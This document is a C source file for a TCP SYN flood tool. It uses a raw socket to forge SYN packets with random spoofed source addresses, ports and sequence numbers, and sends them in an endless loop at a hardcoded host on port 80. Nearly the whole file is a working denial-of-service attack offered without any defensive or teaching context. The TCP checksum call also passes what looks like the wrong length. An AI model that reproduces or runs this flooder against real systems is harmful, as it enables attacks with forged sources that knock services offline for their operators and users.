/* TCP_syn_flooding.c
Update: 2020-05-12T01:42:00+08@China-Guangdong-Zhanjiang+08
*/

#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#include <stdbool.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#if 0

struct tcphdr {
	__be16  source;
	__be16  dest;
	__be32  seq;
	__be32  ack_seq;
#if defined(__LITTLE_ENDIAN_BITFIELD)
	__u16   res1 : 4,
		doff : 4,
		fin : 1,
		syn : 1,
		rst : 1,
		psh : 1,
		ack : 1,
		urg : 1,
		ece : 1,
		cwr : 1;
#elif defined(__BIG_ENDIAN_BITFIELD)
	__u16   doff : 4,
		res1 : 4,
		cwr : 1,
		ece : 1,
		urg : 1,
		ack : 1,
		psh : 1,
		rst : 1,
		syn : 1,
		fin : 1;
#else
#error  "Adjust your <asm/byteorder.h> defines"
#endif
	__be16  window;
	__sum16 check;
	__be16  urg_ptr;
};

#endif

#if 0

struct iphdr {
#if defined(__LITTLE_ENDIAN_BITFIELD)
	__u8    ihl : 4,
		version : 4;
#elif defined (__BIG_ENDIAN_BITFIELD)
	__u8    version : 4,
		ihl : 4;
#else
#error  "Please fix <asm/byteorder.h>"
#endif
	__u8    tos;
	__be16  tot_len;
	__be16  id;
	__be16  frag_off;
	__u8    ttl;
	__u8    protocol;
	__sum16 check;
	__be32  saddr;
	__be32  daddr;
	/*The options start here. */
};

#endif


bool check(bool failed, const char *file, const int line, const char *function, const int error, const char *message) {
	if (failed) {
		fprintf(stderr, "[%s:%d:%s]%d#%s", file, line, function, error, message);
		if (!(0 == errno && 0 == error)) {
			fprintf(stderr, "#%s", strerror(errno));
		}
		fprintf(stderr, "\n");
	}
	errno = 0;
	return failed;
}

void sigint(int signo) {

}


unsigned short checksum(void *data, int length) {
	unsigned int sum = 0;
	unsigned short *ptr = data;

	while (length > 1) {
		sum += ptr[0];
		ptr += 1;
		length -= 2;
	}
	if (length == 1) {
		sum += ((unsigned char *)ptr)[0];
	}

	while (sum >> 16 != 0) {
		sum = (sum >> 16) + (sum & 0xFFFF);
	}

	return (unsigned short)(~sum);
}

int TCP_syn_flooding(char *ip, unsigned short port) {
	int ret = 0;

	int raw_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	struct sockaddr_in target = {
		.sin_addr.s_addr = inet_addr(ip),
		.sin_port = htons(port)
	};

	/* TCP syn packet */
	struct {
		struct iphdr ip;
		struct tcphdr tcp;
	} packet;

	/* for TCP header checksum */
	struct {
		unsigned int begin_ip4;
		unsigned int end_ip4;
		unsigned char padding;
		unsigned char protocol;
		unsigned short length_tcp;
		struct tcphdr tcp;
	} pseudo;


	// 20 bit, tcp header
	packet.tcp.source = 0;                     // 16 bit, source port
	packet.tcp.dest = target.sin_port;         // 16 bit, destination port
	packet.tcp.seq = 0;                        // 32 bit, sequence number
	packet.tcp.ack_seq = 0;                    // 32 bit, acknowledgement number
	packet.tcp.doff = 5;                       //  4 bit, data offset
	packet.tcp.res1 = 0;                       //  4 bit, reserved
	packet.tcp.urg = 0;                        //  1 bit, urgent offset valid flag
	packet.tcp.ack = 0;                        //  1 bit, acknoledgement field valid flag
	packet.tcp.psh = 0;                        //  1 bit, push flag
	packet.tcp.rst = 0;                        //  1 bit, reset flag
	packet.tcp.syn = 1;                        //  1 bit, synchronize sequence number flag
	packet.tcp.fin = 0;                        //  1 bit, finish sending flag
	packet.tcp.window = htons(242);            // 16 bit, windows size
	packet.tcp.check = 0;                      // 16 bit, checksum
	packet.tcp.urg_ptr = 0;                    // 16 bit, urgent offset

	// 20 bit, ip header
	packet.ip.version = 4;                     //  4 bit, version
	packet.ip.ihl = 5;                         //  4 bit, internet header length
	packet.ip.tos = 0;                         //  8 bit, type of service
	packet.ip.tot_len = htons(sizeof(packet)); // 16 bit, total length
	packet.ip.id = getpid();                   // 16 bit, ID field
	packet.ip.frag_off = 0;                    // 16 bit, fragment offset
	packet.ip.ttl = 255;                       //  8 bit, time to live
	packet.ip.protocol = IPPROTO_TCP;          //  8 bit, protocol
	packet.ip.check = 0;                       // 16 bit, checksum
	packet.ip.saddr = 0;                       // 32 bit, source address
	packet.ip.daddr = target.sin_addr.s_addr;  // 32 bit, destination address


	while (true) {
		packet.ip.saddr = htonl(rand());
		packet.ip.check = 0;
		packet.ip.check = checksum(&packet.ip, sizeof(packet.ip));

		packet.tcp.source = htons(rand());    // htons(1025 + rand() % 60000);
		packet.tcp.seq = htonl(rand());       // 761013 + rand() % 100000;
		packet.tcp.check = 0;
		pseudo.begin_ip4 = packet.ip.saddr;
		pseudo.end_ip4 = packet.ip.daddr;
		pseudo.padding = 0;
		pseudo.protocol = IPPROTO_TCP;
		pseudo.length_tcp = htons(sizeof(packet.tcp));
		pseudo.tcp = packet.tcp;
		packet.tcp.check = checksum(&pseudo, sizeof(packet));

		sendto(raw_fd, &packet, sizeof(packet), 0, (struct sockaddr *)&target, sizeof(target));
		ret += 1;
	}

	return ret;
}

int main(int argc, char *argv[]) {
	char *ip = "192.168.12.160";
	unsigned port = 80;

	TCP_syn_flooding(ip, port);

	return 0;
}
